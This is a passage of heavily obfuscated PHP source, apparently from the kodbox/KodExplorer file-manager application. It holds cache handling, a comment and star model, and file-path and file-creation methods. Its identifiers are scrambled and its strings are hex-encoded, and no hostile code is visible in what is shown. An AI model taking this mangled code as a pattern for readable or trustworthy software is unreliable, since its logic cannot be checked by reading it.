array($_SERVER[³à¼î¯á][864] => $çŠçõ×, $_SERVER[³à¼î¯á][865] => $»¬¡å¨, $_SERVER[³à¼î¯á][866] => $éúÈËˆ); Backup::set($¹£šÓ‘°); $ˆ˜×˜Åà = $ü‚€ÀÈ = 0; } } $üÛ˜ĞÌ = count($›‹Û—¦Ê); $Ï£‘·ø ++; } while ($üÛ˜ĞÌ == $£ö¶ı™•); $ÕˆÅ™ŸÉ->end(); $¹£šÓ‘° = array($_SERVER[³à¼î¯á][867] => 1, $_SERVER[³à¼î¯á][806] => time(), $_SERVER[³à¼î¯á][820] => 1, $_SERVER[³à¼î¯á][864] => $çŠçõ×, $_SERVER[³à¼î¯á][868] => time()); if ($ü‚€ÀÈ) { $¹£šÓ‘°[$_SERVER[³à¼î¯á][865]] = $»¬¡å¨; $¹£šÓ‘°[$_SERVER[³à¼î¯á][866]] = $éúÈËˆ; } Backup::set($¹£šÓ‘°); return !0; } private function _fileExist($ª¶€‰, &$ÔÌÆáËÖ, $É™Ø¦Å­) { $ßÊÕÓ =& $_SERVER[³à¼î¯á]; $€ÎÙ‚¹Ÿ = $ª¶€‰[$ßÊÕÓ[87]]; if (in_array($ª¶€‰[$ßÊÕÓ[516]], $ÔÌÆáËÖ)) { return !1; } if (!in_array($ª¶€‰[$ßÊÕÓ[861]], $É™Ø¦Å­)) { return !1; } if (IO::exist($€ÎÙ‚¹Ÿ)) { return !0; } $©’Ê¥ = get_path_father($€ÎÙ‚¹Ÿ); if (IO::exist($©’Ê¥)) { $ÔÌÆáËÖ[] = $ª¶€‰[$ßÊÕÓ[516]]; return !1; } $ÍŠöÂ†Ø = array($ßÊÕÓ[861] => $ª¶€‰[$ßÊÕÓ[861]], $ßÊÕÓ[87] => array($ßÊÕÓ[434], "{$©’Ê¥}\x25")); $›éŒ°÷Ü = Model($ßÊÕÓ[833])->where($ÍŠöÂ†Ø)->field($ßÊÕÓ[517])->select(); $ÔÌÆáËÖ = array_merge($ÔÌÆáËÖ, array_to_keyvalue($›éŒ°÷Ü, $ßÊÕÓ[12], $ßÊÕÓ[516])); return !1; } private function _fileFilter($ÎÇı·çõ) { $¿È¼ÖŸ¤ =& $_SERVER[³à¼î¯á]; return; if (empty($ÎÇı·çõ)) { return; } $§ªÎÄı½ = array($¿È¼ÖŸ¤[516] => array($¿È¼ÖŸ¤[7], array_unique($ÎÇı·çõ))); $¯ğ§Ô¹Ë = Model($¿È¼ÖŸ¤[869])->where($§ªÎÄı½)->field($¿È¼ÖŸ¤[184])->select(); foreach ($¯ğ§Ô¹Ë as $Ô˜½‡åœ) { Model($¿È¼ÖŸ¤[869])->remove($Ô˜½‡åœ[$¿È¼ÖŸ¤[184]], !1); } } private function storeIds() { $ĞÚÍ•Î· =& $_SERVER[³à¼î¯á]; $öŒ¾‰ñ = Model($ĞÚÍ•Î·[812])->listData(); $ÖÆ«£ıı = array(); $´·ç¶³¹ = $GLOBALS[$ĞÚÍ•Î·[6]][$ĞÚÍ•Î·[92]][$ĞÚÍ•Î·[870]]; foreach ($öŒ¾‰ñ as $½¡±Ô…) { $Ê¨àËìĞ = strtolower($½¡±Ô…[$ĞÚÍ•Î·[98]]); if (!isset($´·ç¶³¹[$Ê¨àËìĞ])) { continue; } $œÖ›Í†Ì = $ĞÚÍ•Î·[77] . (isset($´·ç¶³¹[$Ê¨àËìĞ]) ? $´·ç¶³¹[$Ê¨àËìĞ] : ucfirst($Ê¨àËìĞ)); if (!class_exists($œÖ›Í†Ì)) { continue; } $ÖÆ«£ıı[] = $½¡±Ô…[$ĞÚÍ•Î·[450]]; } return $ÖÆ«£ıı; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¾¸ ‰ôÅ =& $_SERVER[³à¼î¯á]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÎÙ®®Şş = $GLOBALS[$¾¸ ‰ôÅ[6]][$¾¸ ‰ôÅ[400]]; $ï“‘Õ®’ = $ÎÙ®®Şş[$ÎÙ®®Şş[$¾¸ ‰ôÅ[871]]]; $ÁëÅ«Ô = $ÎÙ®®Şş[$¾¸ ‰ôÅ[872]]; switch ($ÎÙ®®Şş[$¾¸ ‰ôÅ[871]]) { case $¾¸ ‰ôÅ[21]: self::$handle = Model($¾¸ ‰ôÅ[873]); break; case $¾¸ ‰ôÅ[874]: self::$handle = new CacheRedis($ï“‘Õ®’, $ÁëÅ«Ô); break; case $¾¸ ‰ôÅ[875]: self::$handle = new CacheMemcached($ï“‘Õ®’, $ÁëÅ«Ô); break; case $¾¸ ‰ôÅ[221]: self::$handle = new CacheFile($ï“‘Õ®’, $ÁëÅ«Ô); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($‚¦é‡èâ) { if (is_array($‚¦é‡èâ) || is_object($‚¦é‡èâ)) { $‚¦é‡èâ = json_encode($‚¦é‡èâ); } $‚¦é‡èâ = rawurlencode($‚¦é‡èâ); return md5(KOD_SITE_ID . $_SERVER[³à¼î¯á][11] . $‚¦é‡èâ); } public static function get($­¯ò¼ëˆ, $º£Í°„ = false) { $É»ÏôË® = self::key($­¯ò¼ëˆ); $ò¾ÏÂŸ = self::init(); if ($º£Í°„) { return unserialize($ò¾ÏÂŸ->get($É»ÏôË®)); } if (!isset(self::$memoryCache[$É»ÏôË®])) { $ùâïâìá = $ò¾ÏÂŸ->get($É»ÏôË®); self::$memoryCache[$É»ÏôË®] = unserialize($ùâïâìá); } return self::$memoryCache[$É»ÏôË®]; } public static function set($ªàØ†®, $¸…Û±…, $»„šÄ¶ = false) { $¦ÅÁà =& $_SERVER[³à¼î¯á]; $ıÌìÆ = self::key($ªàØ†®); if (isset(self::$memoryCache[$ıÌìÆ]) && self::$memoryCache[$ıÌìÆ] === $¸…Û±…) { return !0; } if ($»„šÄ¶ === 0) { self::$memoryCache[$ıÌìÆ] = $¸…Û±…; return !0; } $ïô‚ã¡š = self::init(); $‘Æ†Îû“ = serialize($¸…Û±…); CacheLock::lock($ªàØ†® . $¦ÅÁà[876]); $ºüµÃÊé = $ïô‚ã¡š->set($ıÌìÆ, $‘Æ†Îû“, $»„šÄ¶); self::$memoryCache[$ıÌìÆ] = $¸…Û±…; CacheLock::unlock($ªàØ†® . $¦ÅÁà[876]); return $ºüµÃÊé; } public static function getCall($õü”Ÿ¦š, $ÚàıÊ‚ú, $«‚€¢ÃË, $Ô¯›—¥ê = array()) { $ÑáùÄƒ =& $_SERVER[³à¼î¯á]; $£­¯âËâ = self::get($õü”Ÿ¦š); if ($£­¯âËâ || $£­¯âËâ === $ÑáùÄƒ[12]) { return $£­¯âËâ; } $£­¯âËâ = call_user_func_array($«‚€¢ÃË, $Ô¯›—¥ê); $£­¯âËâ = $£­¯âËâ ? $£­¯âËâ : $ÑáùÄƒ[12]; self::set($õü”Ÿ¦š, $£­¯âËâ, $ÚàıÊ‚ú); return $£­¯âËâ; } public static function remove($Ç”ôí„…) { $¢ÌÃæŸ¹ = self::key($Ç”ôí„…); unset(self::$memoryCache[$¢ÌÃæŸ¹]); self::clearTimeout(); CacheLock::lock($Ç”ôí„…); $†ø©—ó‡ = self::init()->remove($¢ÌÃæŸ¹); CacheLock::unlock($Ç”ôí„…); return $†ø©—ó‡; } public static function removeMemory($­Á¬§ã) { $ÄÁ’¡¦Ÿ = self::key($­Á¬§ã); unset(self::$memoryCache[$ÄÁ’¡¦Ÿ]); } public static function clearMemory($¶¹¦›ïœ = false) { if ($¶¹¦›ïœ) { $¶¹¦›ïœ = self::key($¶¹¦›ïœ); unset(self::$memoryCache[$¶¹¦›ïœ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[³à¼î¯á][877])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[³à¼î¯á][878])) { self::init()->clearTimeout(); } } } goto fÍßÌ«ÌŞ; EíÔİæ¾ßÄ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\156\164"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\x6d\x65" => "\x63\x6f\155\x6d\x65\x6e\x74\137\x6d\x65\x74\x61", "\x6d\145\164\141\106\151\145\154\144" => "\143\x6f\155\x6d\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($à‚Ï£¡Ã) { $‚¯©® =& $_SERVER[³à¼î¯á]; if ($à‚Ï£¡Ã[$‚¯©®[1981]]) { $Ï±éäÑË = $this->where(array($‚¯©®[1982] => $à‚Ï£¡Ã[$‚¯©®[1981]]))->find(); if (!$Ï±éäÑË || $Ï±éäÑË[$‚¯©®[181]] != $à‚Ï£¡Ã[$‚¯©®[181]] || $Ï±éäÑË[$‚¯©®[545]] != $à‚Ï£¡Ã[$‚¯©®[545]]) { return !1; } $this->where(array($‚¯©®[1982] => $à‚Ï£¡Ã[$‚¯©®[1981]]))->setAdd($‚¯©®[1983], 1); } $à‚Ï£¡Ã[$‚¯©®[1984]] = 0; $à‚Ï£¡Ã[$‚¯©®[1983]] = 0; $à‚Ï£¡Ã[$‚¯©®[795]] = 1; return $this->add($à‚Ï£¡Ã); } public function commentCount($Ùâ‰èÎÕ, $Ú…®ÒãÁ, $ñÖ”ÈØ = false) { $Ãº‰¯¥í =& $_SERVER[³à¼î¯á]; if (!$Ùâ‰èÎÕ) { return array(); } if (is_string($Ùâ‰èÎÕ) || is_int($Ùâ‰èÎÕ)) { $Ùâ‰èÎÕ = array($Ùâ‰èÎÕ); } $¦äéÓ‚ = array($Ãº‰¯¥í[545], $Ãº‰¯¥í[1985] => $Ãº‰¯¥í[541]); $¨ˆûÏğ = array($Ãº‰¯¥í[545] => array($Ãº‰¯¥í[7], $Ùâ‰èÎÕ), $Ãº‰¯¥í[181] => $Ú…®ÒãÁ); if ($ñÖ”ÈØ) { $¨ˆûÏğ[$Ãº‰¯¥í[1753]] = $ñÖ”ÈØ; } $Òé”Œ“­ = $this->field($¦äéÓ‚)->where($¨ˆûÏğ)->group($Ãº‰¯¥í[545])->select(); return array_to_keyvalue($Òé”Œ“­, $Ãº‰¯¥í[545], $Ãº‰¯¥í[541]); } public function starTarget($·•âçÕ, $‘›ë†–Î) { $…°†¢¡ =& $_SERVER[³à¼î¯á]; $‘˜§ÂÃİ = $·•âçÕ + self::TYPE_STAR_OFFSET; $€·ëç« = array($…°†¢¡[1753] => USER_ID, $…°†¢¡[181] => $‘˜§ÂÃİ, $…°†¢¡[545] => $‘›ë†–Î); $¥ªµ®¿Ñ = $this->where($€·ëç«)->find(); if ($¥ªµ®¿Ñ) { return $this->where(array($…°†¢¡[450] => $¥ªµ®¿Ñ[$…°†¢¡[450]]))->delete(); } $‘¨™İşö = array($…°†¢¡[1981] => 0, $…°†¢¡[1753] => USER_ID, $…°†¢¡[795] => 1, $…°†¢¡[799] => $…°†¢¡[12], $…°†¢¡[181] => $‘˜§ÂÃİ, $…°†¢¡[545] => $‘›ë†–Î, $…°†¢¡[1984] => 0, $…°†¢¡[1983] => 0); return $this->add($‘¨™İşö); } public function starTargetCount($æ®–â×Î, $ÀÇæ² à) { $¼ßİÜ¨ì =& $_SERVER[³à¼î¯á]; $¤éæà¼Õ = $ÀÇæ² à + self::TYPE_STAR_OFFSET; $ŞÆá¿õœ = $this->commentCount($æ®–â×Î, $¤éæà¼Õ); $Øô¬«Ñ¸ = $this->commentCount($æ®–â×Î, $¤éæà¼Õ, USER_ID); return array($¼ßİÜ¨ì[1986] => $ŞÆá¿õœ, $¼ßİÜ¨ì[1987] => $Øô¬«Ñ¸); } public function starTargetUserList($Ûğ·•¨¡, $ÄİÈ¼âŞ) { $Û†šÍàô =& $_SERVER[³à¼î¯á]; $°­°Œô = $Ûğ·•¨¡ + self::TYPE_STAR_OFFSET; $ÅƒŠ¨Ú€ = array($Û†šÍàô[545] => $ÄİÈ¼âŞ, $Û†šÍàô[181] => $°­°Œô); $ Ã»åÀ” = $this->where($ÅƒŠ¨Ú€)->count(); $«êû¯¥§ = array($Û†šÍàô[307] => $ Ã»åÀ”, $Û†šÍàô[1988] => array()); if (!$ Ã»åÀ”) { return $«êû¯¥§; } $ƒËõÆú = $this->field($Û†šÍàô[1753])->where($ÅƒŠ¨Ú€)->limit(500)->select(); $ƒËõÆú = array_to_keyvalue($ƒËõÆú, $Û†šÍàô[12], $Û†šÍàô[1753]); $«êû¯¥§[$Û†šÍàô[1988]] = Model($Û†šÍàô[553])->userListInfo($ƒËõÆú); return $«êû¯¥§; } public function prasiseUserList($—™şúª) { $¾ğ®œàÙ =& $_SERVER[³à¼î¯á]; $ŒÈ€™‘ş = array($¾ğ®œàÙ[1989] => $—™şúª); $§‹çÏ‡ = $this->where($ŒÈ€™‘ş)->find(); $ÎÑìÁÛğ = _get($§‹çÏ‡, $¾ğ®œàÙ[1984], 0); $ñáÂã¯ = array($¾ğ®œàÙ[307] => $ÎÑìÁÛğ, $¾ğ®œàÙ[1988] => array()); if (!$ÎÑìÁÛğ) { return $ñáÂã¯; } $ÃàÊ©é = Model($¾ğ®œàÙ[1990])->field($¾ğ®œàÙ[1753])->where($ŒÈ€™‘ş)->limit(500)->select(); $ÃàÊ©é = array_to_keyvalue($ÃàÊ©é, $¾ğ®œàÙ[12], $¾ğ®œàÙ[1753]); $ñáÂã¯[$¾ğ®œàÙ[1988]] = Model($¾ğ®œàÙ[553])->userListInfo($ÃàÊ©é); return $ñáÂã¯; } public function remove($©›¡±÷) { $ÛÚ˜¹ğŠ =& $_SERVER[³à¼î¯á]; $­˜î‹™Ü = array($ÛÚ˜¹ğŠ[1982] => $©›¡±÷); $ï™ôÙÈß = $this->where($­˜î‹™Ü)->find(); if ($ï™ôÙÈß[$ÛÚ˜¹ğŠ[1981]]) { $this->where(array($ÛÚ˜¹ğŠ[1982] => $ï™ôÙÈß[$ÛÚ˜¹ğŠ[1981]]))->setAdd($ÛÚ˜¹ğŠ[1983], -1); } return $this->where($­˜î‹™Ü)->delete(); } public function edit($ŞÑ¼Å—Ó, $¾‘’»Ê) { $ê¹¦äÛ =& $_SERVER[³à¼î¯á]; $‰¼©½ª¾ = array($ê¹¦äÛ[1982] => $ŞÑ¼Å—Ó); return $this->where($‰¼©½ª¾)->save(array($ê¹¦äÛ[1991] => $¾‘’»Ê)); } public function prasise($¾¾ÙéÏ¢) { $Š³ à€± =& $_SERVER[³à¼î¯á]; $Éšš…¨È = Model($Š³ à€±[1992]); $óõšòñ = array($Š³ à€±[1982] => $¾¾ÙéÏ¢, $Š³ à€±[1744] => USER_ID); $Ã·ã–êÀ = $Éšš…¨È->where($óõšòñ)->find(); if (!$Ã·ã–êÀ) { $Éšš…¨È->add($óõšòñ); $àÄÜç—³ = $this->where(array($Š³ à€±[1982] => $¾¾ÙéÏ¢))->setAdd($Š³ à€±[1984], 1); } else { $Éšš…¨È->where($óõšòñ)->delete(); $àÄÜç—³ = $this->where(array($Š³ à€±[1982] => $¾¾ÙéÏ¢))->setAdd($Š³ à€±[1984], -1); } return $àÄÜç—³; } public function targetInfo($á¸Î¦Ş°, $ƒèİîÛ¬) { $É„İšõê =& $_SERVER[³à¼î¯á]; $†·¬ı¡ˆ = array($É„İšõê[623] => $á¸Î¦Ş°, $É„İšõê[624] => $ƒèİîÛ¬); $¯÷‹ıí¶ = $this->where($†·¬ı¡ˆ)->count(); $¼¿ªœû = "\122\111\x47\x48\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\x63\157\x6d\155\145\x6e\x74\x5f\x70\x72\141\x69\163\x65\x20\163\x74\141\162\x20\157\156\40\x63\x6f\x6d\x6d\145\x6e\x74\56\143\157\x6d\x6d\145\156\164\x49\104\40\x3d\40\163\164\x61\162\56\143\157\x6d\155\x65\x6e\164\x49\104"; $¬‰”ÕÔë = $this->alias($É„İšõê[405])->where($†·¬ı¡ˆ)->join($¼¿ªœû, $É„İšõê[1993])->count(); $’Üó¨Ûƒ = array($É„İšõê[1994] => $¯÷‹ıí¶, $É„İšõê[1995] => $¬‰”ÕÔë); return $’Üó¨Ûƒ; } public function listData($Ì±úÙå) { $ÒÀÍ©şˆ =& $_SERVER[³à¼î¯á]; if (isset($Ì±úÙå[$ÒÀÍ©şˆ[1996]])) { if ($Ì±úÙå[$ÒÀÍ©şˆ[1996]]) { $Ì±úÙå[$ÒÀÍ©şˆ[1989]] = array($ÒÀÍ©şˆ[1064], intval($Ì±úÙå[$ÒÀÍ©şˆ[1996]])); } unset($Ì±úÙå[$ÒÀÍ©şˆ[1996]]); } if (isset($Ì±úÙå[$ÒÀÍ©şˆ[1997]])) { if ($Ì±úÙå[$ÒÀÍ©şˆ[1997]]) { $Ì±úÙå[$ÒÀÍ©şˆ[1989]] = array($ÒÀÍ©şˆ[1061], intval($Ì±úÙå[$ÒÀÍ©şˆ[1997]])); } unset($Ì±úÙå[$ÒÀÍ©şˆ[1997]]); } return $this->_listData($Ì±úÙå); } private function _listData($–ÏâóÄ™) { $ˆ´Øüš =& $_SERVER[³à¼î¯á]; $Áé§œèÍ = $this->where($–ÏâóÄ™)->_makeOrder()->selectPage(100); $this->_listAppendParent($Áé§œèÍ[$ˆ´Øüš[420]]); $this->_listAppendUser($Áé§œèÍ[$ˆ´Øüš[420]]); $this->_listAppendMeta($Áé§œèÍ[$ˆ´Øüš[420]]); return $Áé§œèÍ; } private function _makeOrder() { $ÑÈ¡„åš =& $_SERVER[³à¼î¯á]; $áş¸“ù× = array($ÑÈ¡„åš[1984], $ÑÈ¡„åš[1983], $ÑÈ¡„åš[222]); $îÙ ãš = Input::get($ÑÈ¡„åš[505], $ÑÈ¡„åš[7], $ÑÈ¡„åš[472], $áş¸“ù×); $ü•Ä¬©É = Input::get($ÑÈ¡„åš[506], $ÑÈ¡„åš[7], $ÑÈ¡„åš[1746], array($ÑÈ¡„åš[1998], $ÑÈ¡„åš[501])); $éªØ–ïˆ = $îÙ ãš . $ÑÈ¡„åš[53] . $ü•Ä¬©É; return $this->order($éªØ–ïˆ); } private function _listAppendParent(&$çÖ÷ï±») { $ôöáëå =& $_SERVER[³à¼î¯á]; $”˜´¨ûè = array_unique(array_to_keyvalue($çÖ÷ï±», $ôöáëå[12], $ôöáëå[1981])); $”˜´¨ûè = array_remove_value($”˜´¨ûè, $ôöáëå[219]); if (!$”˜´¨ûè) { return; } $‡å™Óèã = $this->where(array($ôöáëå[1982] => array($ôöáëå[7], $”˜´¨ûè)))->select(); $‡å™Óèã = array_to_keyvalue($‡å™Óèã, $ôöáëå[1989]); foreach ($çÖ÷ï±» as &$€­ÅğŠÁ) { if (isset($‡å™Óèã[$€­ÅğŠÁ[$ôöáëå[1981]]])) { $€­ÅğŠÁ[$ôöáëå[1999]] = $‡å™Óèã[$€­ÅğŠÁ[$ôöáëå[1981]]]; } } unset($€­ÅğŠÁ); } private function _listAppendUser(&$º…“”Ñó) { $¿şîåºœ =& $_SERVER[³à¼î¯á]; $Çàµé· = array_unique(array_to_keyvalue($º…“”Ñó, $¿şîåºœ[12], $¿şîåºœ[1753])); $Çàµé· = array_remove_value($Çàµé·, $¿şîåºœ[219]); if (count($Çàµé·) == 0) { return; } foreach ($º…“”Ñó as $òä¢ÛÜ¤) { if (isset($òä¢ÛÜ¤[$¿şîåºœ[1999]])) { $Çàµé·[] = $òä¢ÛÜ¤[$¿şîåºœ[1999]][$¿şîåºœ[1753]]; } } $²Ã³Üü = Model($¿şîåºœ[574])->userListInfo($Çàµé·); foreach ($º…“”Ñó as &$òä¢ÛÜ¤) { $òä¢ÛÜ¤[$¿şîåºœ[637]] = $²Ã³Üü[$òä¢ÛÜ¤[$¿şîåºœ[1753]]]; if (isset($òä¢ÛÜ¤[$¿şîåºœ[1999]])) { $òä¢ÛÜ¤[$¿şîåºœ[1999]][$¿şîåºœ[637]] = $²Ã³Üü[$òä¢ÛÜ¤[$¿şîåºœ[1999]][$¿şîåºœ[1753]]]; } } unset($òä¢ÛÜ¤); } private function _listAppendMeta(&$†©½å«Ê) { $õ×óú¦Á =& $_SERVER[³à¼î¯á]; $Æş‘ç = array_unique(array_to_keyvalue($†©½å«Ê, $õ×óú¦Á[12], $õ×óú¦Á[1989])); $Æş‘ç = array_remove_value($Æş‘ç, $õ×óú¦Á[219]); if (!$Æş‘ç) { return; } foreach ($†©½å«Ê as $ßËÜé„) { if (isset($ßËÜé„[$õ×óú¦Á[1999]])) { $Æş‘ç[] = $ßËÜé„[$õ×óú¦Á[1999]][$õ×óú¦Á[1989]]; } } $Á‡˜´¬ = $this->metaList($Æş‘ç); if (!$Á‡˜´¬) { return !1; } foreach ($†©½å«Ê as &$ßËÜé„) { $ßËÜé„[$õ×óú¦Á[514]] = $Á‡˜´¬[$ßËÜé„[$õ×óú¦Á[1989]]]; if (isset($ßËÜé„[$õ×óú¦Á[1999]])) { $ßËÜé„[$õ×óú¦Á[1999]][$õ×óú¦Á[514]] = $Á‡˜´¬[$ßËÜé„[$õ×óú¦Á[1999]][$õ×óú¦Á[1989]]]; } } unset($ßËÜé„); } private function metaList($Š‚¶Â) { $ÌÏÂ©î¦ =& $_SERVER[³à¼î¯á]; if (!$Š‚¶Â) { return array(); } $·Æ„ëö = array($ÌÏÂ©î¦[1989] => array($ÌÏÂ©î¦[7], $Š‚¶Â)); $Š§è×ôÎ = Model($ÌÏÂ©î¦[2000])->where($·Æ„ëö)->select(); $Š§è×ôÎ = array_to_keyvalue_group($Š§è×ôÎ, $ÌÏÂ©î¦[1989]); foreach ($Š§è×ôÎ as $„ˆãøÉ => $×Ò¸­‹¸) { $«ÚüÊ¬ = array(); foreach ($×Ò¸­‹¸ as $‚ï¥¼ìº) { $«ÚüÊ¬[$‚ï¥¼ìº[$ÌÏÂ©î¦[97]]] = $‚ï¥¼ìº[$ÌÏÂ©î¦[425]]; } $Š§è×ôÎ[$„ˆãøÉ] = $«ÚüÊ¬; } return $Š§è×ôÎ ? $Š§è×ôÎ : array(); } public function removeTarget($›í¶»öì, $ªäê•Ø) { $Šó›íê =& $_SERVER[³à¼î¯á]; if (!$ªäê•Ø) { return !0; } $ªäê•Ø = is_array($ªäê•Ø) ? $ªäê•Ø : array($ªäê•Ø); $”¡Ì»Áä = array($Šó›íê[181] => $›í¶»öì, $Šó›íê[545] => array($Šó›íê[7], $ªäê•Ø)); $ºŞí¤é = $this->field($Šó›íê[1989])->where($”¡Ì»Áä)->select(); $€¢ğÕğá = array_to_keyvalue($ºŞí¤é, $Šó›íê[12], $Šó›íê[1989]); if (!$€¢ğÕğá) { return !0; } $”¡Ì»Áä = array($Šó›íê[1989] => array($Šó›íê[7], $€¢ğÕğá)); $this->where($”¡Ì»Áä)->delete(); Model($Šó›íê[1992])->where($”¡Ì»Áä)->delete(); Model($Šó›íê[2001])->where($”¡Ì»Áä)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\x65\x5f\143\157\156\164\x65\x6e\x74\163"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\151\155\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\x66\x75\156\143\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\141\x6d\145" => "\x69\157\137\x66\x69\154\145\x5f\155\x65\164\141", "\155\145\164\141\106\x69\x65\x6c\144" => "\x66\151\x6c\145\111\104"); public function fileInfo($±Ü—„Œ‚) { $ííìº¬ =& $_SERVER[³à¼î¯á]; static $âÔ„ï¨â = array(); if (!isset($âÔ„ï¨â[$±Ü—„Œ‚])) { $›»¬ƒ› = $ííìº¬[2002]; $àŒˆß«ê = Model($ííìº¬[519])->field($›»¬ƒ›)->where(array($ííìº¬[517] => $±Ü—„Œ‚))->find(); $âÔ„ï¨â[$±Ü—„Œ‚] = $àŒˆß«ê; } return $âÔ„ï¨â[$±Ü—„Œ‚]; } public function addFileByContent($ÅœšÙ»« = '', $‰ã¸Ö”Œ = '') { $„ƒœ«¯Ä =& $_SERVER[³à¼î¯á]; $¸ë§øÔ = TEMP_PATH . $„ƒœ«¯Ä[2003]; if (!is_dir($¸ë§øÔ)) { mk_dir($¸ë§øÔ); } $”Ñê«” = $¸ë§øÔ . $„ƒœ«¯Ä[2004] . rand_string(16); file_put_contents($”Ñê«”, $ÅœšÙ»«); $÷ê€¶¡Ä = $this->addFile($”Ñê«”, $‰ã¸Ö”Œ, !0); if (file_exists($”Ñê«”)) { @unlink($”Ñê«”); } return $÷ê€¶¡Ä; } public function createFileName($‚ÙÈ´ÌÇ, $Êïñ¨Ÿ½ = false, $‰¬è…Õê = false) { $Óóï“Î =& $_SERVER[³à¼î¯á]; $‡ã —ø– = IO::init($Óóï“Î[8]); $‡§ö’§ß = $this->makeFilePath($‚ÙÈ´ÌÇ, $‡ã —ø–, $Êïñ¨Ÿ½, $‰¬è…Õê); $Û„¦Æ“º = $‡ã —ø–->pathFather($‡§ö’§ß); static $ë·ßÅ¬ = false; $³„®óÕ = $Óóï“Î[2005] . md5($Û„¦Æ“º); if (!$ë·ßÅ¬ && !Cache::get($³„®óÕ)) { $ë·ßÅ¬ = !0; $ù±ÍÒ  = IO::mkdir($Û„¦Æ“º); if (!IO::exist($ù±ÍÒ  . $Óóï“Î[841])) { IO::mkfile($ù±ÍÒ  . $Óóï“Î[841]); } Cache::set($³„®óÕ, 1, 3600 * 2); } return $‡§ö’§ß; } public function makeFilePath($œÛ®Ï„, $ÃáúÃ»‘, $Œ°õ‹‰ = false, $øøÊ = false) { $™†Úş«Ğ =& $_SERVER[³à¼î¯á]; $÷­‡€°‰ = Model($™†Úş«Ğ[815])->get($™†Úş«Ğ[2006]); $º¶‘ûÉ¢ = KodIO::defaultIO() . date($™†Úş«Ğ[2007]); $”ï”øÌ• = $º¶‘ûÉ¢ . rand_string(5) . short_id(100); $œÛ®Ï„ = str_replace($™†Úş«Ğ[8], $™†Úş«Ğ[11], KodIO::clear($œÛ®Ï„)); $áéŒ¯Õ = $ÃáúÃ»‘->ext($œÛ®Ï„); if (!$œÛ®Ï„) { $÷­‡€°‰ = $™†Úş«Ğ[2008]; } switch ($÷­‡€°‰) { case $™†Úş«Ğ[2009]: if ($áéŒ¯Õ) { $”ï”øÌ• = $”ï”øÌ• . $™†Úş«Ğ[10] . $áéŒ¯Õ; } if ($áéŒ¯Õ == $™†Úş«Ğ[1945]) { $”ï”øÌ• .= $™†Úş«Ğ[1260]; } break; case $™†Úş«Ğ[2010]: $Şíˆ§™™ = Model($™†Úş«Ğ[815])->get($™†Úş«Ğ[816]); $‹ó½£ê¡ = substr(md5($™†Úş«Ğ[817] . $Şíˆ§™™ . date($™†Úş«Ğ[793])), 0, 8); $ÍÅıºÍ  = KodIO::defaultDriver(); $º¶‘ûÉ¢ = $™†Úş«Ğ[1291] . $ÍÅıºÍ [$™†Úş«Ğ[450]] . $™†Úş«Ğ[459] . date($™†Úş«Ğ[2011]) . $‹ó½£ê¡ . $™†Úş«Ğ[8]; if ($áéŒ¯Õ == $™†Úş«Ğ[1945]) { $œÛ®Ï„ .= $™†Úş«Ğ[1260]; } $âÚø½Ğ = $™†Úş«Ğ[2012] . $º¶‘ûÉ¢ . $œÛ®Ï„; CacheLock::lock($âÚø½Ğ); $”ï”øÌ• = $º¶‘ûÉ¢ . $œÛ®Ï„; if (IO::exist($º¶‘ûÉ¢ . $œÛ®Ï„)) { $”É€É›ñ = substr($œÛ®Ï„, 0, strlen($œÛ®Ï„) - strlen($áéŒ¯Õ)); $¢öûÛúƒ = $øøÊ ? substr($øøÊ, 0, 5) : ($Œ°õ‹‰ ? substr($Œ°õ‹‰, 0, 5) : rand_string(5)); $”ï”øÌ• = $º¶‘ûÉ¢ . $”É€É›ñ . $¢öûÛúƒ; if ($áéŒ¯Õ) { $”ï”øÌ• = $”ï”øÌ• . $™†Úş«Ğ[10] . $áéŒ¯Õ; } } if (IO::isOsDriver($”ï”øÌ•) && !IO::isUploadServer($”ï”øÌ•)) { if (IO::exist($”ï”øÌ•)) { return $”ï”øÌ•; } $“¶êøÛŞ = IO::setContent($”ï”øÌ•, $™†Úş«Ğ[12]); if (!$“¶êøÛŞ) { show_json($™†Úş«Ğ[2013], !1); } } CacheLock::unlock($âÚø½Ğ); break; case $™†Úş«Ğ[2008]: break; default: break; } return $”ï”øÌ•; } public function addFileByRemote($õã»¬¹ì, $´«ĞäÄ, $ŸèËÈƒŞ = array()) { $¶ä¦¾ò› =& $_SERVER[³à¼î¯á]; if (!IO::exist($õã»¬¹ì)) { return !1; } $ÆÔöô±ˆ = $ŸèËÈƒŞ[$¶ä¦¾ò›[522]] ? $ŸèËÈƒŞ[$¶ä¦¾ò›[522]] : $¶ä¦¾ò›[12]; $ó¼Œ«Ì¸ = IO::hashMd5($õã»¬¹ì, $ÆÔöô±ˆ); $Ï™Õ”ûŸ = KodIO::defaultDriver(); $¤‰üéÎë = array($¶ä¦¾ò›[592] => IO::size($õã»¬¹ì), $¶ä¦¾ò›[2014] => 1, $¶ä¦¾ò›[469] => $´«ĞäÄ, $¶ä¦¾ò›[852] => $Ï™Õ”ûŸ[$¶ä¦¾ò›[450]], $¶ä¦¾ò›[470] => $õã»¬¹ì, $¶ä¦¾ò›[2015] => $ŸèËÈƒŞ[$¶ä¦¾ò›[647]] ? $ŸèËÈƒŞ[$¶ä¦¾ò›[647]] : 